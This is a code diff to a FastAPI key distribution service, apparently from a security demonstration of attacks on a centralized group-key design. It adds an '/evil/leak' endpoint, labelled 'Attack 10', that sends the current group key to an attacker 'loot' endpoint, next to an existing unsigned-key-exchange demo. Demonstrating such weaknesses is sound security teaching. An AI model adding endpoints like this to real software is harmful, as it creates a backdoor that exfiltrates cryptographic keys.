@@ -37,6 +37,22 @@ def create_app(cfg: Config, kdc: Kdc) -> FastAPI:
         kdc.rekey("operator request")
         return kdc.status()
 
+    @app.post("/evil/leak")
+    def evil_leak() -> dict:
+        """Attack 10: a compromised KDC hands the current group key to the attacker
+        (the evil broker). The centralized design makes this possible: the KDC
+        holds every group key."""
+        import httpx
+
+        epoch, key = kdc.epoch, kdc._key
+        httpx.post(
+            f"{cfg.proxy_url}/loot",
+            json={"source": "kdc", "epoch": epoch, "key": key.hex(), "origin": "compromised KDC"},
+            timeout=5,
+        ).raise_for_status()
+        log.info(f"☠ COMPROMISED: handed the epoch-{epoch} group key to the attacker")
+        return {"leaked_epoch": epoch}
+
     @app.post("/allow-unsigned")
     def allow_unsigned(body: DeviceBody) -> dict:
         """Attack 6 demo only: accept ONE unsigned key exchange from this device."""
